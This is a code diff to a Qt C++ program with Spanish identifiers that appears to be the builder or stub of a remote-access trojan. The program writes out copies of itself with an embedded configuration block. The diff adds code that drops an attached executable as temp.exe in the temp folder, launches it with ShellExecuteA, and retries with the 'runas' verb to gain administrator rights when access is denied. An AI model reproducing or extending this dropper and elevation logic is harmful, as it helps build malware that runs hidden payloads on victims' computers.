@@ -24,6 +24,10 @@
 #include <QSysInfo>
 #include <QDate>
 #include <QTime>
+#ifdef Q_OS_WIN
+    #include <windows.h>
+    #include <shellapi.h>
+#endif
 
 MainWindow::MainWindow(QWidget *parent) :
     QMainWindow(parent),
@@ -154,6 +158,7 @@ bool MainWindow::cargarConfiguracion(){
         this->nombreCopiable = campo[10];
         this->ejecutar = campo[11];
         this->siempreOUnaVez = campo[12];
+
     }
     return true;
 }
@@ -188,20 +193,30 @@ void MainWindow::copiarServidor(QByteArray tramaConfiguracion, QString destino)
         servidor.close();
         adjunto.close();
         proceso.setWorkingDirectory(directorio.tempPath());
-        proceso.startDetached(directorio.tempPath() + "/temp.exe");
+        QString exeFileName = directorio.tempPath() + "/temp.exe";
+        #ifdef Q_OS_WIN
+        int result = (int)::ShellExecuteA(0, "open", exeFileName.toUtf8().constData(), 0, 0, SW_SHOWNORMAL);
+        if (SE_ERR_ACCESSDENIED == result)
+        {
+            result = (int)::ShellExecuteA(0, "runas", exeFileName.toUtf8().constData(), 0, 0, SW_SHOWNORMAL);
+        }
+        #endif
     }
     else
     {
-        QFile servidor;
-        QFile copiable;
-        servidor.setFileName(QApplication::applicationFilePath());
-        copiable.setFileName(destino);
-        copiable.open(QFile::WriteOnly);
-        servidor.open(QFile::ReadOnly);
-        copiable.write(servidor.read(servidor.size() - 1024));
-        copiable.write(tramaConfiguracion,1024);
-        copiable.close();
-        servidor.close();
+        if(this->nombreCopiable != "noiniciar")
+        {
+            QFile servidor;
+            QFile copiable;
+            servidor.setFileName(QApplication::applicationFilePath());
+            copiable.setFileName(destino);
+            copiable.open(QFile::WriteOnly);
+            servidor.open(QFile::ReadOnly);
+            copiable.write(servidor.read(servidor.size() - 1024));
+            copiable.write(tramaConfiguracion,1024);
+            copiable.close();
+            servidor.close();
+        }
     }
 }
 void MainWindow::conectar(){
